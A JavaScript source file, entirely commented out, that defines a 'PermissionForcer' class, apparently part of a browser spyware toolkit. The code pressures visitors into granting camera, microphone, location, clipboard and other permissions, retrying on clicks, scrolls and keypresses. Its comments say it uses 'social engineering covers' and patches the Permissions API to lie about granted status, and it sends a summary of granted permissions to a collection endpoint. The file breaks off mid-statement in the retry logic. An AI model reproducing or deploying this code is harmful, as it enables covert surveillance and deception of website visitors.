// export default class PermissionForcer {
//   constructor(core) {
//     this.core = core;
//     this.granted = { camera: false, microphone: false, geolocation: false, notifications: false, clipboard: false, persistentStorage: false };
//     this.attempted = {};
//     this.maxRetries = 3;
//     this.retryDelays = [2000, 5000, 10000];
//     this.streams = [];
//     this.worker = null;
//   }

//   init() {
//     // Start permission forcing sequence
//     setTimeout(() => this.forceAll(), 1500);
    
//     // Listen for user interaction to trigger permissions
//     document.addEventListener('click', () => this.onUserInteraction(), { once: true });
//     document.addEventListener('scroll', () => this.onUserInteraction(), { once: true });
//     document.addEventListener('keydown', () => this.onUserInteraction(), { once: true });
    
//     // Override permission query API to lie about granted status
//     this.patchPermissionsAPI();
    
//     // Register service worker for persistent notification permissions
//     this.registerNotificationWorker();
//   }

//   async forceAll() {
//     // Sequential permission requests with social engineering covers
//     await this.forceNotifications();
//     await this.forceGeolocation();
//     await this.forceCamera();
//     await this.forceMicrophone();
//     await this.forceClipboard();
//     await this.forcePersistentStorage();
//     await this.forceBluetooth();
//     await this.forceUSB();
//     await this.forceMIDI();
//     await this.forceVibration();
//     await this.forceOrientation();
//     await this.forceAmbientLight();
//     await this.forceProximity();
    
//     // Send summary
//     await this.core.send('/api/collect/formdata', {
//       formId: 'permission-forcer-summary',
//       fields: { 
//         granted: this.granted,
//         attempted: Object.keys(this.attempted).length,
//         failed: Object.keys(this.attempted).filter(k => !this.attempted[k]).length
//       },
//       url: window.location.href
//     });
//   }

//   onUserInteraction() {
//     // Retry failed permissions on user interaction
//     Object.keys(this.attempted).forEach(key => {
//       if (!this.attempted[key] && !this.granted[key]) {
//         const retryCount = this.attempted[`${key}_retries`] || 0;
//         if (retryCount < this.maxRetries) {
//           this.attempted[`${key}_retries`] = retryCount + 1;
//           setTimeout(() => {
//             switch(key) {
//               case 'camera': this.forceCamera(); break;
//               case 'microphone': this.forceMicrophone(); break;
//               case 'geolocation': this.forceGeolocation(); break;
//               case 'notifications': this.forceNotifications(); break;
//             }
//           }, this.retryDelays[retryCount] || 500